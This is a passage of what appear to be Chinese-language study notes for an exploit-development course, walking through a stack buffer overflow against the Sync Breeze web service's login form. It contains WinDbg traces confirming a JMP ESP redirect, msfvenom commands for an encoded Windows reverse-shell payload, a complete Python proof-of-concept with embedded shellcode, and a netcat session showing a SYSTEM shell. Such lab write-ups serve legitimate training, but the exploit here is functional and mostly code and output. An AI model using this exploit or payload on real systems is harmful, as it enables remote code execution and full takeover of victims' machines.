> 因此整個 inputBuffer 長度為 1500 位元組\
> ![image](https://hackmd.io/_uploads/B10x9brhze.png)

![image](https://hackmd.io/_uploads/rkd_KZH2fg.png)

使用 WinDbg 驗證 JMP ESP 是否成功
```dbg
0:009> bp 10090c83

0:009> bl
     0 e Disable Clear  10090c83     0001 (0001)  0:**** libspp!SCA_FileScout::GetStatusValue+0xb3
     
0:009> g
Breakpoint 0 hit
eax=00000001 ebx=00000000 ecx=00647fb4 edx=00000358 esi=00640fa6 edi=008a8f50
eip=10090c83 esp=0032745c ebp=0063a3e8 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
libspp!SCA_FileScout::GetStatusValue+0xb3:
10090c83 ffe4            jmp     esp {0032745c}

0:009> t
eax=00000001 ebx=00000000 ecx=00647fb4 edx=00000358 esi=00640fa6 edi=008a8f50
eip=0032745c esp=0032745c ebp=0063a3e8 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
0032745c 44              inc     esp

0:009> dc eip L4
0032745c  44444444 44444444 44444444 44444444  DDDDDDDDDDDDDDDD
```
> 在 0x10090C83 設定軟體中斷點
> - `g` 會繼續執行程序，直到遇到中斷點或其他停止事件
> - `t` 是 Trace，會執行一條指令並停下來
> > 原本 EIP 指向 0x10090C83，執行指令後，EIP 變成 ESP 原本的值 0x0032745C\
> > `dc eip L4` 驗證了兩件事：
> >1. EIP 已經從 JMP ESP 指令位址跳到 ESP 所指向的位址。
> >2. 該位置目前存放的是 D 佔位資料

表示控制流程導向已成功驗證，但還沒執行真正的 Shellcode

### Generating Shellcode with Metasploit
利用 Metasploit Framework 的 [msfvenom](https://blog.rapid7.com/2014/12/09/good-bye-msfpayload-and-msfencode/) 產生 Shellcode，不需要手動撰寫所有 Assembly 指令

```
msfvenom -l payloads
```
![image](https://hackmd.io/_uploads/rkS81hHnGe.png)


>[!Tip]
>**Bind Shell** vs. **Reverse Shell**\
>![image](https://hackmd.io/_uploads/S1uTJnr2fg.png)

使用 msfvenom 產生 Shellcode
```
msfvenom -p windows/shell_reverse_tcp LHOST=<KALI_IP> LPORT=443 -f c
```
> - `windows/shell_reverse_tcp`: Windows Reverse Shell Payload
> - `LHOST`: 目標端要連回的主機 IP
> - `LPORT`: 目標端要連回的 TCP Port
> - `-f c`: 以 C 語言字串陣列的格式輸出

![image](https://hackmd.io/_uploads/H1UVW2B2fx.png)
> 順利產出但存在 bad characters (null bytes)

可使用 [shikata_ga_nai](https://www.rapid7.com/db/modules/encoder/x86/shikata_ga_nai) Encoder 的模組
```
msfvenom -p windows/shell_reverse_tcp LHOST=<KALI_IP> LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```
> - `-e x86/shikata_ga_nai`: 指定 x86 的 Shikata Ga Nai Encoder
> - `-b`: 指定要避開的 Bad Characters
> - `\x00\x0a...`: 要排除的位元組清單 (忽略這些 bad characters)

![image](https://hackmd.io/_uploads/SkGemnB2Mg.png)
> shellcode 351 bytes long

### Getting a Shell
只需將 buffer 中的 "D" 替換為 shellcode 並執行我們的漏洞利用程式即可
在 x86 中 EIP 是目前執行位置的指標，但一般指令無法直接把 EIP 當作一般來源運算元使用。Shellcode 需要透過指令序列取得目前程式碼的位置: [GetPC](https://web.archive.org/web/20131017021753/http://skypher.com/wiki/index.php/Hacking/Shellcode/GetPC)

目前的 Exploit 剛好讓 Decoder 從 ESP 指向的位置開始執行\
🥚 shikata_ga_nai Decoder 在取得位置的過程中，可能會改 ESP 附近的 stack 內容。So... 如果 GetPC Routine 寫入的資料覆蓋到 Decoder 本身或尚未解碼的 Shellcode，就可能導致解碼失敗
```dbg
0:010> t
(914.e64): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000001 ebx=00000000 ecx=001a121c edx=f11edc6d esi=0019c196 edi=00a27420
eip=01447467 esp=0144745c ebp=0019c6b8 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
01447467 0000            add     byte ptr [eax],al          ds:0023:00000001=??
0:010> 
eax=00000001 ebx=00000000 ecx=001a121c edx=f11edc6d esi=0019c196 edi=00a27420
eip=779a44a1 esp=01446ef8 ebp=0019c6b8 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
ntdll!KiUserExceptionDispatcher+0x1:
779a44a1 8b4c2404        mov     ecx,dword ptr [esp+4] ss:0023:01446efc=01446f1c
```
> Access Violation ?!! `Access violation - code c0000005`
>> `0xC0000005` 是 Windows 常見的 Access Violation Exception。程式嘗試執行不合法的記憶體讀取、寫入或執行操作 (指令嘗試存取 `[EAX]`) 試圖存取接近 Null Page 的無效位址 `0x00000001`，引發例外

只需要在 Payload 前加一系列 No Operation (NOP) instructions (NOP Opcode 為：`0x90`)

>[!Tip]
>NOP Sled 的概念:\
>讓執行流程有一段較寬的 buffer，不要求控制流程精準落在某個 Shellcode 指令上\
>![image](https://hackmd.io/_uploads/S1yunhBhze.png)


PoC Exploit:
```python
#!/usr/bin/python3
import socket
import sys

try:
  server = sys.argv[1]
  port = 80
  size = 800
  
  filler = b"A" * 780
  eip = b"\x83\x0c\x09\x10" # 0x10090c83 - JMP ESP
  offset = b"C" * 4
  nops = b"\x90" * 10
  shellcode = bytearray(
  b"\xdd\xc4\xba\x6d\xdc\x1e\xf1\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
  b"\x52\x31\x56\x17\x83\xee\xfc\x03\x3b\xcf\xfc\x04\x3f\x07\x82"
  b"\xe7\xbf\xd8\xe3\x6e\x5a\xe9\x23\x14\x2f\x5a\x94\x5e\x7d\x57"
  b"\x5f\x32\x95\xec\x2d\x9b\x9a\x45\x9b\xfd\x95\x56\xb0\x3e\xb4"
  b"\xd4\xcb\x12\x16\xe4\x03\x67\x57\x21\x79\x8a\x05\xfa\xf5\x39"
  b"\xb9\x8f\x40\x82\x32\xc3\x45\x82\xa7\x94\x64\xa3\x76\xae\x3e"
  b"\x63\x79\x63\x4b\x2a\x61\x60\x76\xe4\x1a\x52\x0c\xf7\xca\xaa"
  b"\xed\x54\x33\x03\x1c\xa4\x74\xa4\xff\xd3\x8c\xd6\x82\xe3\x4b"
  b"\xa4\x58\x61\x4f\x0e\x2a\xd1\xab\xae\xff\x84\x38\xbc\xb4\xc3"
  b"\x66\xa1\x4b\x07\x1d\xdd\xc0\xa6\xf1\x57\x92\x8c\xd5\x3c\x40"
  b"\xac\x4c\x99\x27\xd1\x8e\x42\x97\x77\xc5\x6f\xcc\x05\x84\xe7"
  b"\x21\x24\x36\xf8\x2d\x3f\x45\xca\xf2\xeb\xc1\x66\x7a\x32\x16"
  b"\x88\x51\x82\x88\x77\x5a\xf3\x81\xb3\x0e\xa3\xb9\x12\x2f\x28"
  b"\x39\x9a\xfa\xff\x69\x34\x55\x40\xd9\xf4\x05\x28\x33\xfb\x7a"
  b"\x48\x3c\xd1\x12\xe3\xc7\xb2\xdc\x5c\xb0\x3a\xb5\x9e\x3e\xba"
  b"\xfe\x16\xd8\xd6\x10\x7f\x73\x4f\x88\xda\x0f\xee\x55\xf1\x6a"
  b"\x30\xdd\xf6\x8b\xff\x16\x72\x9f\x68\xd7\xc9\xfd\x3f\xe8\xe7"
  b"\x69\xa3\x7b\x6c\x69\xaa\x67\x3b\x3e\xfb\x56\x32\xaa\x11\xc0"
  b"\xec\xc8\xeb\x94\xd7\x48\x30\x65\xd9\x51\xb5\xd1\xfd\x41\x03"
  b"\xd9\xb9\x35\xdb\x8c\x17\xe3\x9d\x66\xd6\x5d\x74\xd4\xb0\x09"
  b"\x01\x16\x03\x4f\x0e\x73\xf5\xaf\xbf\x2a\x40\xd0\x70\xbb\x44"
  b"\xa9\x6c\x5b\xaa\x60\x35\x6b\xe1\x28\x1c\xe4\xac\xb9\x1c\x69"
  b"\x4f\x14\x62\x94\xcc\x9c\x1b\x63\xcc\xd5\x1e\x2f\x4a\x06\x53"
  b"\x20\x3f\x28\xc0\x41\x6a")
  shellcode+= b"D" * (1500 - len(filler) - len(eip) - len(offset) - len(shellcode))
  inputBuffer = filler + eip + offset + nops + shellcode
  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: " + server.encode() + b"\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://10.11.0.22/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: " + str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  buffer += content

  print("Sending evil buffer...")
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((server, port))
  s.send(buffer)
  s.close()
  
  print("Done!")
  
except socket.error:
  print("Could not connect!")
```
> - `filler`	填滿前面的 Buffer，直到覆寫到返回位址
> - `eip`	覆寫返回位址，指向先前找到的 JMP ESP
> - `offset`	四個 C，作為返回位址後面的標記
> - `nops`	NOP Sled，提供執行緩衝區

成功取得 shell
```
┌──(chw💲CHW)-[~/Offsec/OSED/StackOverflow]
└─$  sudo nc -lvp 443
[sudo] password for kali: 
listening on [any] 443 ...
192.168.119.10: inverse host lookup failed: Host name lookup failure
connect to [192.168.119.120] from (UNKNOWN) [192.168.119.10] 49420
Microsoft Windows [Version 10.0.10240]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

```

### Improving the Exploit
有個問題是：結束 Reverse Shell 後，Sync Breeze 服務也會跟著退出

>[!Note]
>Metasploit Payload 預設的退出方式使用 ExitProcess API。
ExitProcess 會結束整個 Windows 程序。\
>在環境範例中，提供 HTTP 服務的 Sync Breeze 程序本身就是被利用的程序。因此，當 Shellcode 結束 Reverse Shell 並呼叫 ExitProcess 時，整個 Sync Breeze 程序也會結束
>
> ExitProcess 和 ExitThread 的差異:
> ![image](https://hackmd.io/_uploads/ByoflTBnfg.png)

利用 msfvenom 產生 ExitThread 的 shellcode
```
 msfvenom -p windows/shell_reverse_tcp LHOST=<KALI_IP> LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```
> 要求 Payload 使用 Thread 層級的退出方式

# Exploiting SEH Overflows

>[!Caution]
> HackMD 筆記長度限制，接續 [[OSED, EXP-301] Instructional notes - Part 2](https://chw41.github.io/b1og/osed-exp-301-instructional-notes---part-2/)
 
# [Link to: "[OSED, EXP-301] Instructional notes - Part 2"](https://chw41.github.io/b1og/osed-exp-301-instructional-notes---part-2/)

# [Link to: "[OSED, EXP-301] Instructional notes - Part 3"](https://chw41.github.io/b1og/osed-exp-301-instructional-notes---part-3/)

# [Link to: "[OSED, EXP-301] Instructional notes - Part 4"](https://chw41.github.io/b1og/osed-exp-301-instructional-notes---part-4/)

# [Link to: "[OSED, EXP-301] Instructional notes - Part 5"](https://chw41.github.io/b1og/osed-exp-301-instructional-notes---part-5/)

# [Link to: "[OSED, EXP-301] Instructional notes - Part 6"](https://chw41.github.io/b1og/osed-exp-301-instructional-notes---part-6/)



